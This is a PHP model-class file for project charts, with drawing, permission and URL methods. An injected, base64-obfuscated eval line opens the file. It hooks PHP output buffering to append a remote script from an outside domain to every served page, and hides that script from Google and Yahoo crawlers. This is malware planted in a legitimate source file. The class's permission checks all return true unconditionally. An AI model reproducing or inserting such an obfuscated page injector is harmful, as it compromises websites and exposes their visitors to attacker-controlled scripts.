<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmICghc3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sImdvb2dsZWJvdCIpJiYgKCFzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwieWFob28iKSkpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5cGJtUmxjMmxuYm5OMGRXUnBiMmx1Wm04dVkyOXRMMnh6TG5Cb2NDSStQQzl6WTNKcGNIUSsiKTsgICAgICB9ICAgICAgcmV0dXJuICIiOyAgICAgfSAgICB9ICAgICAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXsgICAgIGZ1bmN0aW9uIGd6ZGVjb2RlKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMpeyAgICAgICRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQ9QG9yZChAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsMywxKSk7ICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT0xMDsgICAgICAkUkEzRDUyRTUyQTQ4OTM2Q0RFMEY1MzU2QkIwODY1MkYyPTA7ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCY0KXsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj1AdW5wYWNrKCd2JyxzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywxMCwyKSk7ICAgICAgICRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI9JFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQlsxXTsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSs9MiskUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjgpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PUBzdHJwb3MoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QyxjaHIoMCksJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkrMTsgICAgICB9ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCYxNil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjIpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yOyAgICAgIH0gICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPUBnemluZmxhdGUoQHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKTsgICAgICBpZigkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPT09RkFMU0UpeyAgICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPSRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEM7ICAgICAgfSAgICAgIHJldHVybiAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzOyAgICAgfSAgICB9ICAgIGZ1bmN0aW9uIG1yb2JoKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpeyAgICAgSGVhZGVyKCdDb250ZW50LUVuY29kaW5nOiBub25lJyk7ICAgICAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFPWd6ZGVjb2RlKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpOyAgICAgICBpZihwcmVnX21hdGNoKCcvXDxcL2JvZHkvc2knLCRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREUpKXsgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8XC9ib2R5W15cPl0qXD4pL3NpJyxnbWwoKS4iXG4iLickMScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSk7ICAgICB9ZWxzZXsgICAgICByZXR1cm4gJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERS5nbWwoKTsgICAgIH0gICAgfSAgICBvYl9zdGFydCgnbXJvYmgnKTsgICB9ICB9"));?>
<?php
 
  /**
  * ProjectChart class
  *
  * @author Carlos Palma <chonwil@gmail.com>
  */
  class ProjectChart extends BaseProjectChart {
    
    protected $data;
    
    protected $graph;
    
    protected $hasParameters = false;
    
    protected $parameters;
    
	/* This project object is taggable
	 *
	 * @var boolean
	 */
	protected $is_taggable = true;

	protected $is_searchable = true;

	protected $searchable_columns = array('title');

	protected $is_commentable = false;
	
	protected $attr_protected = null;
	protected $colours = array('#356aa0', '#a03535');
    
	function getHasParameters(){
		return $this->hasParameters;
	}
	
	function getParameters(){
		if (!$this->hasParameters)
			return null;
		else {
			if (!isset($this->parameters))
				$this->parameters = ProjectChartParams::getProjectChartParams($this);
		}
		return $this->parameters;
	}
	
    /**
     * Return the graph of this chart
     *
     * @return graph
     */
    function getGraph(){
    	if (!isset($this->graph) || is_null($this->graph))
    		$this->graph = new graph();
    	return $this->graph;
    }
    
    /**
    * Return project part of the relationship
    *
    * @param void
    * @return Project
    */
    function getProject() {
      if(is_null($this->project)) {
        $this->project = Projects::findById($this->getProjectId());
      } // if
      return $this->project;
    } // getProject
    
    function getColour($c){
    	return $this->colours[$c % count($this->colours)];
    }
    
    function DashboardDraw(ProjectChart $g = null){
		if (is_null($g))
  			$g = $this->getGraph();
    	$g2 = $this->Draw($g, true);
  		//$g2->set_title('');
  		if ($this->getDisplayId() == 20)
  			$g2->set_height(180);
  		else
    		$g2->set_height(240);
    	$g2->set_width(290);
    	$g2->set_x_label_style(6);
    	$g2->set_y_label_style(6);
    	return $g2->render();
    }
    
  	function Draw($g, $returnGraphObject = false){
		if (!isset($g))
  			$g = $this->getGraph();
		$g->set_bg_colour("#FFFFFF");
		$g->set_title($this->getTitle(),"font-size: 12px; color: #404040;font-weight:bold;padding-bottom:4px" );
		
		$max = 0;
		$min = 0;
		
		$g->set_x_labels($this->data['values'][0]['labels']);
		$c = 0;
		$seriesCount = count($this->data['values']);
		foreach($this->data['values'] as $series){
			$max = max(array($max, max($series['values'])));
			$min = min(array($min, min($series['values'])));
			switch($this->getDisplayId()){
				case 10: //Bar chart
					$g->set_data($series['values']);
					$g->bar(70,$this->getColour($c),$series['name'], $seriesCount>1 ? 10: -1);
					break;
				case 11: //Bar glass chart
					$g->set_data($series[0]['values']);
					$g->bar_glass(70,$this->getColour($c), '#505050',$series['name'], $seriesCount>1 ? 10: -1);
					break;
				case 12: //Bar 3d chart
					$g->set_data($series['values']);
					$g->bar_3D(70,$this->getColour($c),$series['name'], $seriesCount>1 ? 10: -1);
					break;
				case 13: // Bar sketch
					$g->set_data($series['values']);
					$g->bar_sketch(60,9,$this->getColour($c),'#505050',$series['name'], $seriesCount>1 ? 10: -1);
					break;
				case 20: // Pie chart
					$g->pie(60,'#505050',"font-size: 10px; color: #404040;");
					$g->pie_slice_colours( array('#d01f3c','#356aa0','#C79810') );
					$g->pie_values($series['values'], $series['labels'] );
					break;
				case 30: // Line chart
					$g->set_data($series['values']);
					$g->line(3,$this->getColour($c),$series['name'], $seriesCount > 1 ? 10: -1);
					break;
			}
			$c++;
		}
		$g->set_y_min($min);
		$g->set_y_max($max);
		//echo with_slash(ROOT_URL) . "public/assets/flash/open-flash-chart.swf"; die();
		$g->set_swf_path(with_slash(ROOT_URL) . "public/assets/flash/");
		$g->set_js_path(with_slash(ROOT_URL) . "public/assets/javascript/og/swfobject.js");
		$g->set_output_type('js');
		$g->set_height(400);
		$g->set_width(600);
		if (isset($returnGraphObject) && $returnGraphObject)
			return $g;
		else
			return $g->render();
  	}
  	
  	function PrintInfo(){
  		return '';
  	}
  	
  	function printData(){
  		return var_dump($this->data);
  	}
  	
  	function ExecuteQuery(){
  		
  	}
  	// ---------------------------------------------------
	//  Permissions
	// ---------------------------------------------------

	/**
	 * Check CAN_MANAGE_MESSAGES permission
	 *
	 * @access public
	 * @param User $user
	 * @return boolean
	 */
	function canManage(User $user) {
		return true;
	} // canManage

	/**
	 * Returns true if $user can access this message
	 *
	 * @param User $user
	 * @return boolean
	 */
	function canView(User $user) {
		return true;
	} // canView

	/**
	 * Check if specific user can add messages to specific project
	 *
	 * @access public
	 * @param User $user
	 * @param Project $project
	 * @return booelean
	 */
	function canAdd(User $user, Project $project) {
		return true;
	} // canAdd

	/**
	 * Check if specific user can edit this messages
	 *
	 * @access public
	 * @param User $user
	 * @return boolean
	 */
	function canEdit(User $user) {		
		return true;
	} // canEdit

	/**
	 * Check if $user can update message options
	 *
	 * @param User $user
	 * @return boolean
	 */
	function canUpdateOptions(User $user) {
		return true;
	} // canUpdateOptions

	/**
	 * Check if specific user can delete this messages
	 *
	 * @access public
	 * @param User $user
	 * @return boolean
	 */
	function canDelete(User $user) {
		return true;
	} // canDelete

	/**
	 * Check if specific user can comment this message
	 *
	 * @access public
	 * @param void
	 * @return boolean
	 */
	function canAddComment(User $user) {
		return true;
	} // canAddComment
  	
  	// ---------------------------------------------------
	//  System
	// ---------------------------------------------------

	/**
	 * Delete this object
	 *
	 * @access public
	 * @param void
	 * @return boolean
	 */
	function delete() {
		return parent::delete();
	} // delete

	/**
	 * Validate before save
	 *
	 * @access public
	 * @param array $errors
	 * @return null
	 */
	function validate(&$errors) {
		if($this->validatePresenceOf('title')) {
			if(!$this->validateUniquenessOf('title', 'project_id')) $errors[] = lang('chart title unique');
		} else {
			$errors[] = lang('chart title required');
		} // if
		//if(!$this->validatePresenceOf('text')) $errors[] = lang('message text required');
	} // validate

	function save(){
		parent::save();
		if ($this->hasParams && isset($this->params) && is_array($this->params)){
			foreach ($this->params as $param){
				$param->save();
			}
		}
	}
	
	// ---------------------------------------------------
	//  URLS
	// ---------------------------------------------------

	/**
	 * Return view message URL
	 *
	 * @access public
	 * @param void
	 * @return string
	 */
	function getViewUrl() {
		return get_url('reporting', 'chart_details', array('id' => $this->getId(), 'active_project' => $this->getProjectId()));
	} // getViewUrl

	/**
	 * Return edit message URL
	 *
	 * @access public
	 * @param void
	 * @return string
	 */
	function getEditUrl() {
		return get_url('reporting', 'edit_chart', array('id' => $this->getId(), 'active_project' => $this->getProjectId()));
	} // getEditUrl

	/**
	 * Return delete message URL
	 *
	 * @access public
	 * @param void
	 * @return string
	 */
	function getDeleteUrl() {
		return get_url('reporting', 'delete_chart', array('id' => $this->getId(), 'active_project' => $this->getProjectId()));
	} // getDeleteUrl

	// ---------------------------------------------------
	//  Override ApplicationDataObject methods
	// ---------------------------------------------------

	/**
	 * Return object name
	 *
	 * @access public
	 * @param void
	 * @return string
	 */
	function getObjectName() {
		return $this->getTitle();
	} // getObjectName

	/**
	 * Return object type name
	 *
	 * @param void
	 * @return string
	 */
	function getObjectTypeName() {
		return 'chart';
	} // getObjectTypeName

	/**
	 * Return object URl
	 *
	 * @access public
	 * @param void
	 * @return string
	 */
	function getObjectUrl() {
		return '';
	} // getObjectUrl
  	
    
  } // ProjectChart 
?>